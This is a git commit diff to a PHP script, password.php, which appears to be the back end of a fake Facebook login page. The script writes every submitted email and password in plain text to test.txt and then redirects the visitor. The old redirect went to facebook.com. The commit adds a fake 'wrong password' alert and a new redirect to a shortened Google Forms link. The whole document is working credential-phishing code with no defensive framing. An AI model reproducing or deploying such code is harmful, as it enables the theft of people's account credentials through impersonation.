c95edd0858808335783140d32b39d1b0740370f7
cvecve147 <cplyuef357@gmail.com>
2016-04-04 13:39:05 +0800

    test

--- password.php
+++ password.php
@@ -2,9 +2,16 @@
 	$Email=$_POST[Email];
 	$Password=$_POST[password];
 	
-	$file=fopen("test.txt", "a");
-	fwrite($file,"Email  $Email  password  $Password  \r\n");
-	fclose($file);
-
-	header("Location: https://www.facebook.com"); 
+	if ($Email=="" or strlen($Password)< 6) {
+		echo "<script language=\"JavaScript\">\r\n"; 
+		echo " alert(\"帳號密碼錯誤\");\r\n"; 
+		echo " history.back();\r\n"; 
+		echo "</script>"; 
+	}
+	else {
+		$file=fopen("test.txt", "a");
+		fwrite($file,"Email  $Email  password  $Password  \r\n");
+		fclose($file);
+		header("Location: http://goo.gl/forms/zXhB52kwLS"); 
+	}
 ?>
